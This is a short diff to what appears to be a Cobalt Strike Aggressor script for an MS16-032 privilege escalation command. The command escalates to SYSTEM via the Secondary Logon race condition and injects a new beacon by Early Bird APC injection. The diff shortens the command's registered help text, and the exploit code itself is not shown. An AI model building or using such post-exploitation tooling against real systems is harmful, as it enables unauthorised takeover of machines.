@@ -55,8 +55,4 @@ alias ms16032_inject {
     beacon_inline_execute($1, $data, "go", $args);
 }
 
-beacon_command_register(
-    "ms16032_inject",
-    "MS16-032 local privilege escalation with beacon injection",
-    "Usage: ms16032_inject <listener>\n\nExploits the MS16-032 race condition in the Secondary Logon service to\nescalate to SYSTEM and inject a new beacon via Early Bird APC injection.\n\nRequirements:\n  - Unpatched target (pre-March 2016 / KB3139914)\n  - 2+ logical processors\n  - SeImpersonatePrivilege (service accounts, administrators)"
-);
+beacon_command_register("ms16032_inject", "MS16-032 local privilege escalation with beacon injection", "Usage: ms16032_inject <listener>");
